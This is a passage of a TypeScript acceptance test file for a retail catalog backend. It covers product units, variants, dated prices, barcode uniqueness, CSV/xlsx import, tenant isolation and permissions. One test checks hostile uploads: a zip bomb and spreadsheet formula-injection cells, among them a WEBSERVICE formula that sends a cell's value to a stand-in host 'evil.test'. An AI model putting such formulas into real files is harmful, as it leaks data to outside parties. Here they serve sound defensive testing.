import { randomUUID } from "node:crypto";
import { describe, expect, it } from "vitest";
import { setBusinessStatus } from "@/server/admin/lifecycle";
import * as importModule from "@/server/catalog/import/actions";
import {
  MAX_BASE64_LENGTH,
  commitImport,
  deleteImportBatch,
  downloadRejected,
  getImportBatch,
  listImportBatches,
  stageImport,
  validateImport,
} from "@/server/catalog/import/actions";
import * as pricesModule from "@/server/catalog/prices";
import { getPriceAt, setPrice } from "@/server/catalog/prices";
import * as productsModule from "@/server/catalog/products";
import { addBarcode, addUnit, addVariant, archiveBarcode, archiveTestProducts, createProduct, getProduct, updateProduct } from "@/server/catalog/products";
import * as searchModule from "@/server/catalog/search";
import { searchCatalog } from "@/server/catalog/search";
import * as contextModule from "@/server/catalog/context";
import * as taxonomyModule from "@/server/catalog/taxonomy";
import { actionInfoOf, type ActionMeta } from "@/server/framework/action";
import { gateOf } from "@/server/framework/gate";
import { useTestDb } from "../helpers/db";
import { createBusinessWithStaff, createPlan, createPlatformAdmin } from "../helpers/fixtures";
import { buildXlsx } from "../catalog/import/xlsx-fixture";

/*
 * R1 acceptance (design R1 section 8): the catalog through the real actions against the real
 * database, nothing mocked. Rows that no action creates (plan, platform admin, businesses with their
 * staff and subscription) come from the shared fixtures, as in the R0 acceptance test.
 */

const { db } = useTestDb();

const key = () => randomUUID();
const DAY = 86_400_000;

async function business(label: string) {
  const w = await createBusinessWithStaff(db, {
    branches: ["A"],
    staff: [
      { key: "owner", role: "OWNER" },
      { key: "manager", role: "MANAGER", branches: ["A"] },
      { key: "stock", role: "STOCK", branches: ["A"] },
      { key: "cashier", role: "CASHIER", branches: ["A"] },
    ],
  });
  await db.rtBusiness.update({ where: { id: w.business.id }, data: { status: "ACTIVE", name: label, defaultCurrency: "IQD", enabledCurrencies: ["IQD", "USD"] } });
  const subscription = await db.rtSubscription.create({
    data: { businessId: w.business.id, planCode: "basic", status: "ACTIVE", currentPeriodStart: new Date(Date.now() - DAY), currentPeriodEnd: new Date(Date.now() + 30 * DAY) },
  });
  const as = (who: string, k = key()): ActionMeta => ({ userId: w.staff[who]!.user.id, businessId: w.business.id, idempotencyKey: k });
  return { ...w, subscription, as };
}
type Shop = Awaited<ReturnType<typeof business>>;

async function world() {
  await createPlan(db, { maxBranches: 3 });
  return { a: await business("سوق أ"), b: await business("سوق ب") };
}

function ok<T>(r: { ok: true; value: T } | { ok: false; code: string }): T {
  if (!r.ok) throw new Error(`expected ok, got ${r.code}`);
  return r.value;
}

const b64 = (data: string | Uint8Array) => Buffer.from(typeof data === "string" ? `﻿${data}` : data).toString("base64");

async function importFile(w: Shop, content: string | Uint8Array, fileName = "items.csv") {
  const staged = ok(await stageImport({ fileName, contentBase64: b64(content) }, w.as("owner")));
  const validated = ok(await validateImport({ batchId: staged.batchId, mapping: staged.suggestedMapping }, w.as("owner")));
  return { ...staged, ...validated };
}

async function rowsOf(w: Shop, batchId: string, status?: "OK" | "REJECTED" | "SKIPPED" | "CHANGED" | "COMMITTED") {
  const out: { rowNumber: number; status: string; reason: string | null }[] = [];
  for (let page = 0; ; page += 1) {
    const r = ok(await getImportBatch({ batchId, page, ...(status ? { status } : {}) }, w.as("owner")));
    out.push(...r.rows.map((x) => ({ rowNumber: x.rowNumber, status: x.status, reason: x.reason })));
    if (r.rows.length < 50) return out;
  }
}

const catalogCounts = async (w: Shop) => ({
  products: await db.rtProduct.count({ where: { businessId: w.business.id } }),
  variants: await db.rtVariant.count({ where: { businessId: w.business.id } }),
  units: await db.rtUnit.count({ where: { businessId: w.business.id } }),
  barcodes: await db.rtBarcode.count({ where: { businessId: w.business.id } }),
  prices: await db.rtPrice.count({ where: { businessId: w.business.id } }),
  categories: await db.rtCategory.count({ where: { businessId: w.business.id } }),
  brands: await db.rtBrand.count({ where: { businessId: w.business.id } }),
  batches: await db.rtImportBatch.count({ where: { businessId: w.business.id } }),
  presets: await db.rtImportMappingPreset.count({ where: { businessId: w.business.id } }),
});

async function defaultListId(w: Shop) {
  return (await db.rtPriceList.findFirstOrThrow({ where: { businessId: w.business.id, kind: "DEFAULT" } })).id;
}

describe("R1 acceptance: the catalog", () => {
  it("a carton of 24: two units with a whole factor, each with its own barcode, a derived and an overridden carton price; no zero, negative or fractional factor", async () => {
    const { a } = await world();
    // Derived: no carton price given, so carton = 24 x piece.
    const water = ok(
      await createProduct(
        {
          nameAr: "ماء معدني ٥٠٠ مل",
          baseUnit: { name: "حبة", barcodes: ["6281000000101"] },
          extraUnits: [{ name: "كرتون", factor: 24, barcodes: ["6281000000118"] }],
          price: { currency: "IQD", amountMinor: 250n },
        },
        a.as("owner"),
      ),
    );
    const p = ok(await getProduct({ id: water.productId }, a.as("cashier")));
    const units = p.variants[0]!.units;
    expect(units.map((u) => [u.name, u.factor, u.isBase, u.barcodes.map((b) => b.code)])).toEqual([
      ["حبة", 1, true, ["6281000000101"]],
      ["كرتون", 24, false, ["6281000000118"]],
    ]);
    const list = await defaultListId(a);
    const priceOf = async (unitId: string) => ok(await getPriceAt({ unitId, priceListId: list, currency: "IQD", at: new Date() }, a.as("cashier")))?.amountMinor;
    expect(await priceOf(units[0]!.id)).toBe(250n);
    expect(await priceOf(units[1]!.id)).toBe(6000n);

    // Overridden: the carton is cheaper than 24 pieces (the owner said that happens).
    const juice = ok(
      await createProduct(
        {
          nameAr: "عصير تفاح",
          baseUnit: { name: "حبة", barcodes: ["6281000000125"] },
          extraUnits: [{ name: "كرتون", factor: 24, barcodes: ["6281000000132"], amountMinor: 5500n }],
          price: { currency: "IQD", amountMinor: 250n },
        },
        a.as("owner"),
      ),
    );
    const jp = ok(await getProduct({ id: juice.productId }, a.as("owner")));
    expect(await priceOf(jp.variants[0]!.units[1]!.id)).toBe(5500n);

    // A carton added later to an existing piece: the stored suggestion is factor x the piece price.
    const soap = ok(await createProduct({ nameAr: "صابون", baseUnit: { name: "حبة", barcodes: [] }, price: { currency: "IQD", amountMinor: 1000n } }, a.as("owner")));
    ok(await addUnit({ variantId: soap.variantId, name: "كرتون", factor: 24, barcodes: ["6281000000149"] }, a.as("owner")));
    const sp = ok(await getProduct({ id: soap.productId }, a.as("owner")));
    expect(await priceOf(sp.variants[0]!.units.find((u) => u.factor === 24)!.id)).toBe(24_000n);

    // Zero, negative and fractional factors are refused, and nothing is created.
    const before = await catalogCounts(a);
    for (const factor of [0, -24, 2.5]) {
      const r = await addUnit({ variantId: soap.variantId, name: `كرتون ${factor}`, factor, barcodes: [] }, a.as("owner"));
      expect(r.ok, String(factor)).toBe(false);
      const c = await createProduct({ nameAr: "x", baseUnit: { name: "حبة", barcodes: [] }, extraUnits: [{ name: "كرتون", factor, barcodes: [] }] }, a.as("owner"));
      expect(c.ok, String(factor)).toBe(false);
    }
    expect(await catalogCounts(a)).toEqual(before);
    // The database refuses it too (CHECK), not only the action.
    await expect(db.rtUnit.create({ data: { businessId: a.business.id, variantId: soap.variantId, name: "صفر", factor: 0, isBase: false } })).rejects.toThrow();
  });

  it("a shirt in two sizes and two colours (4 variants): stable ids, unique SKUs, each with its own barcode, found by the model or by the variant", async () => {
    const { a } = await world();
    const shirt = ok(
      await createProduct({ nameAr: "قميص قطن رجالي", options: { المقاس: "M", اللون: "أبيض" }, baseUnit: { name: "قطعة", barcodes: ["2000000000011"] } }, a.as("owner")),
    );
    const more = [
      { المقاس: "L", اللون: "أبيض", code: "2000000000028" },
      { المقاس: "M", اللون: "أزرق", code: "2000000000035" },
      { المقاس: "L", اللون: "أزرق", code: "2000000000042" },
    ];
    for (const { code, ...options } of more) {
      ok(await addVariant({ productId: shirt.productId, options, baseUnit: { name: "قطعة", barcodes: [code] } }, a.as("owner")));
    }
    const first = ok(await getProduct({ id: shirt.productId }, a.as("owner")));
    expect(first.variants).toHaveLength(4);
    const skus = first.variants.map((v) => v.sku);
    expect(new Set(skus).size).toBe(4);
    // Ids do not move when the product changes.
    ok(await updateProduct({ id: shirt.productId, expectedVersion: first.version, nameEn: "Cotton shirt" }, a.as("owner")));
    const again = ok(await getProduct({ id: shirt.productId }, a.as("owner")));
    expect(again.variants.map((v) => [v.id, v.sku, v.units[0]!.id])).toEqual(first.variants.map((v) => [v.id, v.sku, v.units[0]!.id]));
    expect(again.variants.map((v) => v.units[0]!.barcodes[0]!.code).sort()).toEqual(["2000000000011", "2000000000028", "2000000000035", "2000000000042"]);

    // By the model: every variant. By a variant's barcode or SKU: that variant first.
    const byModel = ok(await searchCatalog({ query: "قميص قطن" }, a.as("cashier")));
    expect(new Set(byModel.items.map((h) => h.variantId))).toEqual(new Set(first.variants.map((v) => v.id)));
    const blueL = first.variants.find((v) => (v.options as Record<string, string>)["اللون"] === "أزرق" && (v.options as Record<string, string>)["المقاس"] === "L")!;
    const byCode = ok(await searchCatalog({ query: "2000000000042" }, a.as("cashier")));
    expect(byCode.items[0]).toMatchObject({ variantId: blueL.id, matchedBarcode: "2000000000042" });
    const bySku = ok(await searchCatalog({ query: blueL.sku }, a.as("cashier")));
    expect(bySku.items[0]!.variantId).toBe(blueL.id);
  });

  it("a price edit never changes the price at an earlier date: the old row stays as it was (append-only)", async () => {
    const { a } = await world();
    const tea = ok(await createProduct({ nameAr: "شاي", baseUnit: { name: "علبة", barcodes: [] }, price: { currency: "IQD", amountMinor: 2000n } }, a.as("owner")));
    const list = await defaultListId(a);
    await new Promise((r) => setTimeout(r, 20));
    const beforeEdit = new Date();
    await new Promise((r) => setTimeout(r, 20));
    const original = await db.rtPrice.findFirstOrThrow({ where: { unitId: tea.baseUnitId } });

    ok(await setPrice({ unitId: tea.baseUnitId, listKind: "DEFAULT", currency: "IQD", amountMinor: 2500n }, a.as("manager")));
    const at = (when: Date) => getPriceAt({ unitId: tea.baseUnitId, priceListId: list, currency: "IQD", at: when }, a.as("cashier"));
    expect(ok(await at(beforeEdit))?.amountMinor).toBe(2000n);
    expect(ok(await at(new Date()))?.amountMinor).toBe(2500n);
    // The old row was closed, not rewritten.
    const closed = await db.rtPrice.findUniqueOrThrow({ where: { id: original.id } });
    expect(closed.amountMinor).toBe(2000n);
    expect(closed.validFrom).toEqual(original.validFrom);
    expect(closed.validTo).not.toBeNull();
    expect(await db.rtPrice.count({ where: { unitId: tea.baseUnitId } })).toBe(2);

    // No path rewrites history: a change dated in the past is refused, and the date's price stays.
    const backDated = await setPrice({ unitId: tea.baseUnitId, listKind: "DEFAULT", currency: "IQD", amountMinor: 1n, validFrom: new Date(beforeEdit.getTime() - DAY) }, a.as("owner"));
    expect(backDated.ok).toBe(false);
    expect(ok(await at(beforeEdit))?.amountMinor).toBe(2000n);
  });

  it("barcode 0012345 keeps its zeros in the database, in the import and in search, and is found only with them", async () => {
    const { a } = await world();
    const made = ok(await createProduct({ nameAr: "علكة", baseUnit: { name: "حبة", barcodes: ["0012345"] } }, a.as("owner")));
    expect((await db.rtBarcode.findFirstOrThrow({ where: { businessId: a.business.id } })).code).toBe("0012345");
    const found = ok(await searchCatalog({ query: "0012345" }, a.as("cashier")));
    expect(found.items[0]).toMatchObject({ productId: made.productId, matchedBarcode: "0012345" });
    // Without the zeros it is another code: no exact barcode match.
    const without = ok(await searchCatalog({ query: "12345" }, a.as("cashier")));
    expect(without.items.some((h) => h.matchedBarcode !== undefined)).toBe(false);
    expect(await db.rtBarcode.count({ where: { code: "12345" } })).toBe(0);

    // Import: as CSV text and as an xlsx text cell, the zeros stay; a numeric xlsx cell that lost them is refused.
    const fromCsv = await importFile(a, "الباركود,الاسم\n0012346,علكة نعناع\n");
    ok(await commitImport({ batchId: fromCsv.batchId, onChange: "SKIP", expectedVersion: fromCsv.version }, a.as("owner")));
    const fromXlsx = await importFile(a, buildXlsx([["الباركود", "الاسم"], ["0012347", "علكة فراولة"], [12348, "علكة ليمون"]]), "items.xlsx");
    expect(fromXlsx.summary).toMatchObject({ ok: 1, rejected: 1 });
    expect(fromXlsx.firstRejected[0]!.reason).toBe("NUMERIC_BARCODE_LOST_ZEROS");
    ok(await commitImport({ batchId: fromXlsx.batchId, onChange: "SKIP", expectedVersion: fromXlsx.version }, a.as("owner")));
    const codes = (await db.rtBarcode.findMany({ where: { businessId: a.business.id }, orderBy: { code: "asc" } })).map((b) => b.code);
    expect(codes).toEqual(["0012345", "0012346", "0012347"]);
    expect(ok(await searchCatalog({ query: "0012347" }, a.as("cashier"))).items[0]!.matchedBarcode).toBe("0012347");
  });

  it("a duplicate barcode in the business, even on a second unit, is refused by the DATABASE and by the action; another business may use it", async () => {
    const { a, b } = await world();
    const one = ok(await createProduct({ nameAr: "أرز", baseUnit: { name: "كيس", barcodes: ["6290000000011"] } }, a.as("owner")));
    const two = ok(
      await createProduct({ nameAr: "عدس", baseUnit: { name: "كيس", barcodes: [] }, extraUnits: [{ name: "كرتون", factor: 10, barcodes: [] }] }, a.as("owner")),
    );
    const twoCarton = (await db.rtUnit.findFirstOrThrow({ where: { variantId: two.variantId, factor: 10 } })).id;

    // Straight into the table with the base client (no action, no check): the unique constraint refuses it.
    await expect(db.rtBarcode.create({ data: { businessId: a.business.id, unitId: twoCarton, code: "6290000000011" } })).rejects.toMatchObject({ code: "P2002" });
    await expect(db.rtBarcode.create({ data: { businessId: a.business.id, unitId: two.baseUnitId, code: "6290000000011" } })).rejects.toMatchObject({ code: "P2002" });
    // Through the action: BARCODE_TAKEN naming the owner, for the other product's units and for the same product's second unit.
    expect(await addBarcode({ unitId: twoCarton, code: "6290000000011" }, a.as("owner"))).toMatchObject({ ok: false, code: "BARCODE_TAKEN", details: { productId: one.productId } });
    expect(await createProduct({ nameAr: "مكرر", baseUnit: { name: "كيس", barcodes: ["6290000000011"] } }, a.as("owner"))).toMatchObject({ ok: false, code: "BARCODE_TAKEN" });
    // An archived barcode stays reserved.
    const code = await db.rtBarcode.findFirstOrThrow({ where: { code: "6290000000011", businessId: a.business.id } });
    ok(await archiveBarcode({ id: code.id, expectedVersion: code.version }, a.as("owner")));
    expect(await addBarcode({ unitId: two.baseUnitId, code: "6290000000011" }, a.as("owner"))).toMatchObject({ ok: false, code: "BARCODE_TAKEN" });
    expect(await db.rtBarcode.count({ where: { code: "6290000000011", businessId: a.business.id } })).toBe(1);
    // Unique per business only.
    expect(await createProduct({ nameAr: "أرز", baseUnit: { name: "كيس", barcodes: ["6290000000011"] } }, b.as("owner"))).toMatchObject({ ok: true });
  });

  it("an import of 1000+ mixed rows shows every error, saves only the valid rows; the same file again changes nothing; a mixed re-upload applies UPDATE/SKIP per row", async () => {
    const { a } = await world();
    const milk = ok(await createProduct({ nameAr: "حليب", baseUnit: { name: "علبة", barcodes: ["6291000000000"] }, price: { currency: "IQD", amountMinor: 1000n } }, a.as("owner")));
    const lines = ["الباركود,الاسم,القسم,السعر,العملة"];
    const expected = { ok: 0, rejected: 0, changed: 0, reasons: new Map<string, number>() };
    const reject = (reason: string) => {
      expected.rejected += 1;
      expected.reasons.set(reason, (expected.reasons.get(reason) ?? 0) + 1);
    };
    lines.push("6291000000000,حليب كامل الدسم,ألبان,1000,IQD"); // CHANGED (name, category)
    expected.changed += 1;
    for (let i = 1; i <= 1100; i += 1) {
      const code = `629200${String(i).padStart(7, "0")}`;
      if (i % 100 === 0) {
        lines.push(`${code},صنف ${i},عام,-5,IQD`);
        reject("NEGATIVE_PRICE");
      } else if (i % 100 === 1) {
        lines.push(`${code},صنف ${i},عام,10,EUR`);
        reject("UNKNOWN_CURRENCY");
      } else if (i % 100 === 2) {
        lines.push(`${code},,عام,10,IQD`);
        reject("MISSING_NAME");
      } else if (i % 100 === 50) {
        lines.push(`629200${String(i - 1).padStart(7, "0")},مكرر ${i},عام,10,IQD`); // the barcode of the (valid) row before
        reject("DUPLICATE_IN_FILE");
      } else {
        lines.push(`${code},صنف ${i},عام,${1000 + i},IQD`);
        expected.ok += 1;
      }
    }
    lines.push(lines[5]!); // a line repeated inside the file
    reject("DUPLICATE_IN_FILE");
    const file = lines.join("\n");

    const first = await importFile(a, file);
    expect(first.summary).toEqual({ ok: expected.ok, changed: 1, skipped: 0, rejected: expected.rejected, total: 1102 });
    const rejected = await rowsOf(a, first.batchId, "REJECTED");
    const byReason = new Map<string, number>();
    for (const r of rejected) byReason.set(r.reason!, (byReason.get(r.reason!) ?? 0) + 1);
    expect(byReason).toEqual(expected.reasons);

    const productsBefore = await db.rtProduct.count({ where: { businessId: a.business.id } });
    const committed = ok(await commitImport({ batchId: first.batchId, onChange: "UPDATE", expectedVersion: first.version }, a.as("owner")));
    expect(committed.stats).toMatchObject({ created: expected.ok, updated: 1, rejected: expected.rejected });
    expect(await db.rtProduct.count({ where: { businessId: a.business.id } })).toBe(productsBefore + expected.ok);
    expect((await db.rtProduct.findUniqueOrThrow({ where: { id: milk.productId } })).nameAr).toBe("حليب كامل الدسم");
    // The rejected rows stay with their reasons, ready to download.
    const csvOut = ok(await downloadRejected({ batchId: first.batchId }, a.as("owner")));
    expect(csvOut.trim().split("\r\n")).toHaveLength(1 + expected.rejected);

    // The same file again: everything that was saved reads as unchanged, and saving changes nothing.
    const snapshot = await catalogCounts(a);
    const second = await importFile(a, file);
    expect(second.sameFileBatchId).toBe(first.batchId);
    expect(second.summary).toMatchObject({ ok: 0, changed: 0, skipped: expected.ok + 1, rejected: expected.rejected });
    const again = ok(await commitImport({ batchId: second.batchId, onChange: "UPDATE", expectedVersion: second.version }, a.as("owner")));
    expect(again.stats).toMatchObject({ created: 0, updated: 0 });
    expect(await catalogCounts(a)).toEqual({ ...snapshot, batches: snapshot.batches + 1 });

    // A mixed re-upload: three known products changed; rows 1 and 3 updated, row 2 skipped, one new row.
    const code = (i: number) => `629200${String(i).padStart(7, "0")}`;
    const mixed = await importFile(
      a,
      ["الباركود,الاسم,القسم,السعر,العملة", `${code(10)},صنف عشرة معدل,عام,1010,IQD`, `${code(11)},صنف ${11},عام,9999,IQD`, `${code(12)},صنف ${12},عام,2500,IQD`, `${code(1500)},صنف جديد,عام,700,IQD`].join("\n"),
    );
    expect(mixed.summary).toMatchObject({ ok: 1, changed: 3 });
    const decided = ok(await commitImport({ batchId: mixed.batchId, onChange: { "1": "UPDATE", "2": "SKIP", "3": "UPDATE" }, expectedVersion: mixed.version }, a.as("owner")));
    expect(decided.stats).toMatchObject({ created: 1, updated: 2, skipped: 1 });
    const nameOf = async (c: string) => (await db.rtBarcode.findFirstOrThrow({ where: { businessId: a.business.id, code: c }, include: { unit: { include: { variant: { include: { product: true } } } } } })).unit;
    expect((await nameOf(code(10))).variant.product.nameAr).toBe("صنف عشرة معدل");
    const list = await defaultListId(a);
    const now = async (c: string) => ok(await getPriceAt({ unitId: (await nameOf(c)).id, priceListId: list, currency: "IQD", at: new Date() }, a.as("owner")))?.amountMinor;
    expect(await now(code(11))).toBe(1011n); // skipped: the old price
    expect(await now(code(12))).toBe(2500n); // updated: a new dated price
  }, 120_000);

  it("a hostile file (zip bomb, oversized, too many rows, too wide, formula cells) is refused or neutralised quickly", async () => {
    const { a } = await world();
    const timed = async <T>(run: () => Promise<T>) => {
      const started = Date.now();
      const value = await run();
      expect(Date.now() - started).toBeLessThan(20_000);
      return value;
    };
    const stage = (content: Uint8Array | string, fileName: string) => timed(() => stageImport({ fileName, contentBase64: typeof content === "string" ? content : Buffer.from(content).toString("base64") }, a.as("owner")));

    // Tiny on disk, 60 MB inflated.
    const bomb = buildXlsx([["a"]], { sheetXmlOverride: `<?xml version="1.0"?><worksheet><sheetData>${" ".repeat(60 * 1024 * 1024)}</sheetData></worksheet>` });
    expect(await stage(bomb, "bomb.xlsx")).toMatchObject({ ok: false, code: "IMPORT_TOO_LARGE" });
    // Over 5 MB (refused before decoding).
    expect(await stage("A".repeat(MAX_BASE64_LENGTH + 4), "big.csv")).toMatchObject({ ok: false, code: "IMPORT_TOO_LARGE" });
    // More than 10,000 rows.
    const many = ["الباركود,الاسم", ...Array.from({ length: 10_001 }, (_, i) => `${i + 1},x`)].join("\n");
    expect(await stage(Buffer.from(many), "many.csv")).toMatchObject({ ok: false, code: "IMPORT_TOO_MANY_ROWS" });
    // More than 200 columns.
    const wide = [Array.from({ length: 201 }, (_, i) => `c${i}`).join(","), Array.from({ length: 201 }, () => "1").join(",")].join("\n");
    expect(await stage(Buffer.from(wide), "wide.csv")).toMatchObject({ ok: false, code: "IMPORT_UNREADABLE" });
    // A macro workbook is not read at all.
    expect(await stage(bomb, "macro.xlsm")).toMatchObject({ ok: false, code: "IMPORT_UNREADABLE" });
    expect(await db.rtImportBatch.count({ where: { businessId: a.business.id } })).toBe(0);

    // Formulas: never evaluated (the cached value or the literal text is kept), and neutralised in the rejected file.
    const hostile = buildXlsx([
      ["الباركود", "الاسم", "السعر"],
      ["6293000000017", { f: 'WEBSERVICE("http://evil.test/?x="&A2)', v: "اسم مخزن" }, "1000"],
      ["6293000000024", "=HYPERLINK(\"http://evil.test\",\"click\")", "-"],
      ["6293000000031", "@SUM(1,2)", "abc"],
    ]);
    const staged = await stage(hostile, "formula.xlsx");
    expect(staged.ok).toBe(true);
    if (!staged.ok) return;
    const validated = ok(await validateImport({ batchId: staged.value.batchId, mapping: staged.value.suggestedMapping }, a.as("owner")));
    expect(validated.summary).toMatchObject({ ok: 1, rejected: 2 });
    ok(await commitImport({ batchId: staged.value.batchId, onChange: "SKIP", expectedVersion: validated.version }, a.as("owner")));
    expect((await db.rtProduct.findFirstOrThrow({ where: { businessId: a.business.id } })).nameAr).toBe("اسم مخزن");
    const rejectedCsv = ok(await downloadRejected({ batchId: staged.value.batchId }, a.as("owner")));
    const cells = rejectedCsv
      .replace(/^﻿/, "")
      .trim()
      .split("\r\n")
      .slice(1);
    expect(cells).toHaveLength(2);
    expect(cells[0]).toContain(`'=HYPERLINK(`);
    expect(cells[1]).toContain("'@SUM(1,2)");
    for (const line of cells) expect(line).not.toMatch(/(^|,)"?[=+\-@]/);
  }, 120_000);

  it("isolation: business B neither sees nor changes A's catalog, search results or import batches", async () => {
    const { a, b } = await world();
    const item = ok(await createProduct({ nameAr: "زعفران إيراني", baseUnit: { name: "علبة", barcodes: ["6294000000016"] }, price: { currency: "IQD", amountMinor: 9000n } }, a.as("owner")));
    const batch = await importFile(a, "الباركود,الاسم\n6294000000023,هيل\n");

    expect(await getProduct({ id: item.productId }, b.as("owner"))).toMatchObject({ ok: false, code: "NOT_FOUND" });
    expect(await updateProduct({ id: item.productId, expectedVersion: 1, nameAr: "مسروق" }, b.as("owner"))).toMatchObject({ ok: false, code: "NOT_FOUND" });
    expect(await setPrice({ unitId: item.baseUnitId, listKind: "DEFAULT", currency: "IQD", amountMinor: 1n }, b.as("owner"))).toMatchObject({ ok: false, code: "NOT_FOUND" });
    expect(await addBarcode({ unitId: item.baseUnitId, code: "6294000000030" }, b.as("owner"))).toMatchObject({ ok: false, code: "NOT_FOUND" });
    expect(ok(await searchCatalog({ query: "زعفران" }, b.as("owner"))).items).toEqual([]);
    expect(ok(await searchCatalog({ query: "6294000000016" }, b.as("owner"))).items).toEqual([]);
    // A's batch: invisible and untouchable from B.
    expect(ok(await listImportBatches({ page: 0 }, b.as("owner")))).toEqual([]);
    expect(await getImportBatch({ batchId: batch.batchId, page: 0 }, b.as("owner"))).toMatchObject({ ok: false, code: "NOT_FOUND" });
    expect(await downloadRejected({ batchId: batch.batchId }, b.as("owner"))).toMatchObject({ ok: false, code: "NOT_FOUND" });
    expect(await validateImport({ batchId: batch.batchId, mapping: batch.suggestedMapping }, b.as("owner"))).toMatchObject({ ok: false, code: "NOT_FOUND" });
    expect(await commitImport({ batchId: batch.batchId, onChange: "SKIP" }, b.as("owner"))).toMatchObject({ ok: false, code: "NOT_FOUND" });
    expect(await deleteImportBatch({ batchId: batch.batchId }, b.as("owner"))).toMatchObject({ ok: false, code: "NOT_FOUND" });
    // B's owner acting inside A (not a member): refused before anything.
    expect(await getProduct({ id: item.productId }, { ...b.as("owner"), businessId: a.business.id })).toMatchObject({ ok: false, code: "FORBIDDEN" });

    expect((await db.rtProduct.findUniqueOrThrow({ where: { id: item.productId } })).nameAr).toBe("زعفران إيراني");
    expect(await db.rtImportBatch.findUniqueOrThrow({ where: { id: batch.batchId } })).toMatchObject({ status: "VALIDATED" });
    expect(await db.rtProduct.count({ where: { businessId: b.business.id } })).toBe(0);
  });

  it("a cashier cannot change the catalog or a price: every catalog write is FORBIDDEN", async () => {
    const { a } = await world();
    const before = await catalogCounts(a);
    const writes = writeActions();
    expect(writes.length).toBeGreaterThan(20);
    for (const w of writes) {
      expect(await w.call(sampleInput(w.name), a.as("cashier")), w.name).toMatchObject({ ok: false, code: "FORBIDDEN" });
    }
    for (const [name, wrapper] of PLAIN_WRAPPERS) {
      expect(await wrapper(sampleInput(name), a.as("cashier")), name).toMatchObject({ ok: false, code: "FORBIDDEN" });
    }
    expect(await catalogCounts(a)).toEqual(before);
    expect(await db.rtAuditLog.count({ where: { businessId: a.business.id } })).toBe(0);
  });

  it("READ_ONLY refuses every catalog write, through an expired subscription and through suspension; reads still work", async () => {
    const { a } = await world();
    const admin = await createPlatformAdmin(db);
    ok(await createProduct({ nameAr: "منتج قائم", baseUnit: { name: "حبة", barcodes: ["6295000000015"] } }, a.as("owner")));
    const writes = writeActions();
    // No catalog write is allowed while READ_ONLY (an addition there must be deliberate and listed here).
    expect(writes.filter((w) => w.allowWhenReadOnly).map((w) => w.name)).toEqual(ALLOWED_WHEN_READ_ONLY);

    async function everyWriteRefused() {
      expect(await gateOf(a.business.id, db)).toBe("READ_ONLY");
      const before = await catalogCounts(a);
      const audits = await db.rtAuditLog.count({ where: { businessId: a.business.id } });
      for (const w of writes) {
        expect(await w.call(sampleInput(w.name), a.as("owner")), w.name).toMatchObject({ ok: false, code: "READ_ONLY" });
      }
      for (const [name, wrapper] of PLAIN_WRAPPERS) {
        expect(await wrapper(sampleInput(name), a.as("owner")), name).toMatchObject({ ok: false, code: "READ_ONLY" });
      }
      expect(await catalogCounts(a)).toEqual(before);
      expect(await db.rtAuditLog.count({ where: { businessId: a.business.id } })).toBe(audits);
      // Reads go on.
      expect(ok(await searchCatalog({ query: "منتج قائم" }, a.as("cashier"))).items).toHaveLength(1);
      expect(await listImportBatches({ page: 0 }, a.as("owner"))).toMatchObject({ ok: true });
    }

    // 1. The subscription ended and its grace period passed.
    const lapsed = new Date(Date.now() - 30 * DAY);
    await db.rtSubscription.update({ where: { id: a.subscription.id }, data: { currentPeriodStart: new Date(Date.now() - 60 * DAY), currentPeriodEnd: lapsed, graceDays: 7 } });
    await everyWriteRefused();

    // 2. Back to FULL, then suspended by the platform (the real lifecycle action).
    await db.rtSubscription.update({ where: { id: a.subscription.id }, data: { currentPeriodStart: a.subscription.currentPeriodStart, currentPeriodEnd: a.subscription.currentPeriodEnd } });
    expect(await gateOf(a.business.id, db)).toBe("FULL");
    const biz = await db.rtBusiness.findUniqueOrThrow({ where: { id: a.business.id } });
    ok(await setBusinessStatus({ businessId: a.business.id, next: "SUSPENDED", reason: "متأخر عن دفع الاشتراك", expectedVersion: biz.version }, { userId: admin.id, idempotencyKey: key() }));
    await everyWriteRefused();
  }, 120_000);

  it("Arabic search: احمد finds أحمد, مدرسه finds مدرسة, ٣٠٠ finds 300", async () => {
    const { a } = await world();
    const ahmad = ok(await createProduct({ nameAr: "عطر أحمد الفاخر", baseUnit: { name: "قنينة", barcodes: [] } }, a.as("owner")));
    const school = ok(await createProduct({ nameAr: "حقيبة مدرسة", baseUnit: { name: "قطعة", barcodes: [] } }, a.as("owner")));
    const grams = ok(await createProduct({ nameAr: "جبن 300 غرام", baseUnit: { name: "علبة", barcodes: [] } }, a.as("owner")));
    const first = async (query: string) => ok(await searchCatalog({ query }, a.as("cashier"))).items.map((h) => h.productId);
    expect(await first("احمد")).toContain(ahmad.productId);
    expect(await first("مدرسه")).toContain(school.productId);
    expect(await first("٣٠٠")).toContain(grams.productId);
    // Diacritics and tatweel do not matter either.
    expect(await first("مَدْرَسـة")).toContain(school.productId);
  });
});

// ---------------------------------------------------------------------------------------------
// Every catalog write action, found from the modules themselves (so a new one cannot be forgotten).

/** Writes allowed while READ_ONLY (none in the catalog). */
const ALLOWED_WHEN_READ_ONLY: string[] = [];

const FAKE = "x0000000000000000000000000";
const MAPPING = { barcode: 0, name: 1 };

/**
 * A well-formed input per write action: the permission and the gate are checked after the input
 * parses and before anything is looked up, so ids need not exist. A write without an entry here
 * fails the test: adding an action means adding it here, and so testing it.
 */
const SAMPLES: Record<string, unknown> = {
  "catalog.category.create": { nameAr: "قسم" },
  "catalog.category.rename": { id: FAKE, nameAr: "قسم", expectedVersion: 1 },
  "catalog.category.move": { id: FAKE, parentId: null, expectedVersion: 1 },
  "catalog.category.archive": { id: FAKE, expectedVersion: 1 },
  "catalog.brand.create": { nameAr: "علامة" },
  "catalog.brand.rename": { id: FAKE, nameAr: "علامة", expectedVersion: 1 },
  "catalog.brand.archive": { id: FAKE, expectedVersion: 1 },
  "catalog.product.create": { nameAr: "صنف", baseUnit: { name: "حبة", barcodes: ["6296000000014"] } },
  "catalog.product.update": { id: FAKE, expectedVersion: 1, nameAr: "صنف" },
  "catalog.product.archive": { id: FAKE, expectedVersion: 1 },
  "catalog.product.unarchive": { id: FAKE, expectedVersion: 1 },
  "catalog.product.archiveTestData": {},
  "catalog.variant.add": { productId: FAKE, options: { المقاس: "L" }, baseUnit: { name: "حبة", barcodes: [] } },
  "catalog.variant.archive": { variantId: FAKE, expectedVersion: 1 },
  "catalog.unit.add": { variantId: FAKE, name: "كرتون", factor: 12, barcodes: [] },
  "catalog.unit.update": { id: FAKE, expectedVersion: 1, name: "كرتون" },
  "catalog.unit.archive": { id: FAKE, expectedVersion: 1 },
  "catalog.barcode.add": { unitId: FAKE, code: "6296000000021" },
  "catalog.barcode.archive": { id: FAKE, expectedVersion: 1 },
